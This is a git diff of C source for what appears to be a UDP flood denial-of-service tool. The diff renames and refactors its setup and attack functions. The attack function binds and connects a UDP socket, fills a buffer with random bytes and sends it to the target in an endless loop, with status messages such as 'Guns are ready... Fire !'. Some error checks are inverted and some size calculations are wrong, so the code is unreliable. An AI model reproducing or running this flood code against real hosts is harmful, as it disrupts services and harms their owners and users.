@@ -23,10 +23,9 @@
 
 #include "flood.h"
 
-
-// udp_setup4 fill up the conn4_t structure with the coresponding
+// flood_setup4 fill up the conn4_t structure with the coresponding
 // information in order to fully bind the udp socket at a given host
-static void udp_setup4(conn4_t *conn, const char *host)
+void flood_setup4(conn4_t *conn, const char *host)
 {
 	if (!conn)
 		INFOEE("Empty ipv4 conn pointer, please pass a non null conn");
@@ -47,31 +46,28 @@ static void udp_setup4(conn4_t *conn, const char *host)
 	if (!bind(conn->sock, (SA *)&conn->addr, sizeof(conn->addr)))
 		INFOEE("Could not bind the udp socket");
 
+	if (!connect(conn->sock, (SA*)&conn->addr, sizeof(conn->addr)))
+		INFOEE("Could not connect the udp socket");
+
 	conn->buff = xzmalloc(PK_SIZE * sizeof(conn->buff));
 	for (int i = 0; i < PK_SIZE; i++)
 		// fill up the buffer with random data.
 		urandom_bytes(&conn->buff[i], sizeof(conn->buff[i]));
 }
 
-static void udp_attack4(conn4_t *c)
+void flood_attack4(conn4_t *c)
 {
-	ssize_t sz = 0, n = 0;
+	ssize_t n = 0;
 
 	STATUS("Guns are ready... Fire !");
 	for (;;) {
-		STATUS("Send packet !");
-		n = sendto(c->sock, c->buff, PK_SIZE * sizeof(unsigned char), 0,
-				   (SA *)&c->addr, sizeof(c));
+		n = send(c->sock, c->buff, PK_SIZE * sizeof(c->buff), 0);
 		if (!n) {
 			WSTATUS("Could not send udp packet ...");
 			break;
 		}
-		sz += n;
+		DEBUGF("Send packet of size %d", n);
 	}
-
-	char *msg = xsprintf("The ammount that had been send is %d\n", sz);
-	WSTATUS(msg);
-	xfree(msg);
 }
 
 /*
@@ -98,32 +94,7 @@ static void udp_attack4(conn4_t *c)
  * and start the attack.
  *
  */
-void flood(arguments args)
+void flood(conn_t *conn)
 {
-	//TODO
-	STATUS("UDP-FLOOD attack is starting.");
-	// if random flag is set just alert user
-	// that the UDP Flood already uses random port option
-	// due to the nature of the attack
-	if (args.port.random)
-		STATUS("UDP-FLOOD already uses the random flag.");
-
-	conn_t *conn = NULL;
-	udp_atk atk;
-	memset(&atk, 0, sizeof(atk));
-	conn = conn_new(args.host_type);
-
-	switch (args.host_type) {
-	case IPV4:
-		STATUS("UDP-FLOOD is using ipv4.");
-		udp_setup4(conn->c4, args.host);
-		udp_attack4(conn->c4);
-		close(conn->c4->sock);
-		xfree(conn->c4->buff);
-		break;
-	case IPV6:
-		break;
-	}
-	
-	conn_free(conn, args.host_type);
+	flood_attack4(conn->c4);
 }
